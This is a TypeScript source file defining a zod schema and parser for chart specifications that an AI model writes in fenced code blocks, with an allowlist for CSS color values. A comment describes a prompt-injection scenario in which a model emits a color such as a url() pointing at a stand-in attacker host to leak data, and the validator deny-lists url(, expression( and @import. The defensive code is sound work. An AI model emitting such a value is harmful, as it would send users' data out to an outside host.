import { z } from "zod";

export const PLOT_LANGUAGE = "numi-plot" as const;

/**
 * Color-string allowlist for chart series colors and custom palettes.
 *
 * `color` and `palette[]` flow straight into SVG `fill` / `stroke`
 * attributes on recharts primitives. The CSS spec allows `url(...)` as
 * a color value, and the browser will issue a network request for the
 * URL even though it can't actually resolve to a paint — that's an
 * info-leak vector if a prompt injection ever convinces the model to
 * emit something like `"color": "url(https://attacker.example/?t=...)"`.
 * We defend in depth by only accepting a fixed set of safe color
 * notations: hex (`#abc` / `#abcdef` / 4- and 8-digit alpha forms),
 * CSS named colors, `rgb()` / `rgba()` / `hsl()` / `hsla()` /
 * `hwb()` / `oklch()` / `oklab()` / `lab()` / `lch()` / `color()`,
 * and `var(--token)` references.
 *
 * 64 char cap is more than enough for any of the above and stops
 * pathological inputs from reaching the regex engine.
 */
const SAFE_COLOR_FUNCTIONS =
  /^(?:rgb|rgba|hsl|hsla|hwb|oklch|oklab|lab|lch|color)\([-0-9a-zA-Z.,%\s/+]+\)$/;
// Only 3-, 4-, 6-, and 8-digit forms are valid CSS hex colors;
// 5- and 7-digit strings are silently dropped by the browser.
const SAFE_HEX = /^#(?:[0-9a-fA-F]{3,4}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})$/;
const SAFE_NAMED = /^[a-zA-Z]{3,32}$/;
const SAFE_VAR = /^var\(--[a-zA-Z][\w-]*\)$/;

const isSafeColor = (input: string): boolean => {
  const trimmed = input.trim();
  if (!trimmed || trimmed.length > 64) return false;
  // Reject the dangerous CSS shapes outright before pattern-matching,
  // so a permissive regex can't be sidestepped.
  const lower = trimmed.toLowerCase();
  if (
    lower.includes("url(") ||
    lower.includes("expression(") ||
    lower.includes("/*") ||
    lower.includes("@import")
  ) {
    return false;
  }
  return (
    SAFE_HEX.test(trimmed) ||
    SAFE_NAMED.test(trimmed) ||
    SAFE_VAR.test(trimmed) ||
    SAFE_COLOR_FUNCTIONS.test(trimmed)
  );
};

const colorSchema = z
  .string()
  .max(64)
  .refine(isSafeColor, {
    message:
      "must be a hex (#abc / #abcdef), named CSS color, rgb/rgba/hsl/hsla/hwb/oklch/oklab/lab/lch/color(...), or var(--token) reference",
  });

/**
 * Single legend entry / series binding.
 *
 * `key` references a numeric field on each row of `data`. `label` is what
 * the legend/tooltip displays; if omitted, `key` is shown verbatim.
 * `color` overrides the palette cycle for this series only — it accepts
 * any CSS color string (the model is told to prefer design tokens via
 * `var(--color-blue-4)` etc., but this is not enforced at parse time).
 * `kind` applies only to `type: "composed"` and selects the geometry
 * for this series; ignored for every other chart type.
 */
const plotSeriesSchema = z.object({
  key: z.string().min(1),
  label: z.string().optional(),
  color: colorSchema.optional(),
  kind: z.enum(["bar", "line", "area"]).optional(),
});

/**
 * One row of plotting data. `x` is the categorical / temporal axis value
 * (string or number). Every other entry is treated as a numeric series
 * indexed by `key` in {@link plotSeriesSchema}.
 */
const plotDatumSchema = z
  .object({
    x: z.union([z.string(), z.number()]),
  })
  .catchall(z.union([z.string(), z.number(), z.null()]));

const plotChartTypeSchema = z.enum([
  "line",
  "bar",
  "area",
  "scatter",
  "pie",
  "donut",
  "composed",
  "radar",
  "radial-bar",
]);

const plotPaletteNameSchema = z.enum([
  "default",
  "blue",
  "mint",
  "rose",
  "warm",
  "cool",
]);

const plotPaletteSchema = z.union([
  plotPaletteNameSchema,
  z.array(colorSchema).min(1).max(16),
]);

export const plotSpecSchema = z.object({
  type: plotChartTypeSchema,
  title: z.string().max(200).optional(),
  subtitle: z.string().max(300).optional(),
  xLabel: z.string().max(80).optional(),
  yLabel: z.string().max(80).optional(),
  data: z.array(plotDatumSchema).min(1).max(500),
  series: z.array(plotSeriesSchema).min(1).max(8),
  /** Stacked bar / area chart. Ignored for scatter, line, and pie. */
  stacked: z.boolean().optional(),
  /** Smooth lines / areas (`monotone`) vs straight (`linear`). Defaults to `monotone`. */
  curve: z.enum(["linear", "monotone", "step"]).optional(),
  /** Hide the legend when only one series is plotted. Default: auto-hide for 1 series. */
  showLegend: z.boolean().optional(),
  /** Override the default palette cycle. */
  palette: plotPaletteSchema.optional(),
});

export type PlotSpec = z.infer<typeof plotSpecSchema>;
export type PlotSeries = z.infer<typeof plotSeriesSchema>;
export type PlotChartType = z.infer<typeof plotChartTypeSchema>;
export type PlotPalette = z.infer<typeof plotPaletteSchema>;

/**
 * Parse a raw fenced-code body into a validated {@link PlotSpec}.
 *
 * Returns `{ ok: true, spec }` on success, or `{ ok: false, reason }`
 * describing whether the body was not yet valid JSON (still streaming),
 * or was valid JSON but failed schema validation. Splitting these two
 * cases lets the renderer show a typed skeleton mid-stream rather than
 * a hard error.
 */
export type PlotParseResult =
  | { ok: true; spec: PlotSpec }
  | { ok: false; reason: "invalid-json"; error: string }
  | { ok: false; reason: "schema"; error: string };

export const parsePlot = (raw: string): PlotParseResult => {
  const trimmed = raw.trim();
  if (!trimmed) {
    return { ok: false, reason: "invalid-json", error: "Empty plot body" };
  }

  let parsed: unknown;
  try {
    parsed = JSON.parse(trimmed);
  } catch (error) {
    return {
      ok: false,
      reason: "invalid-json",
      error: error instanceof Error ? error.message : "Invalid JSON",
    };
  }

  const result = plotSpecSchema.safeParse(parsed);
  if (result.success) {
    return { ok: true, spec: result.data };
  }

  const first = result.error.issues[0];
  const path = first?.path?.join(".") ?? "";
  const message = first?.message ?? "Invalid plot spec";
  return {
    ok: false,
    reason: "schema",
    error: path ? `${path}: ${message}` : message,
  };
};
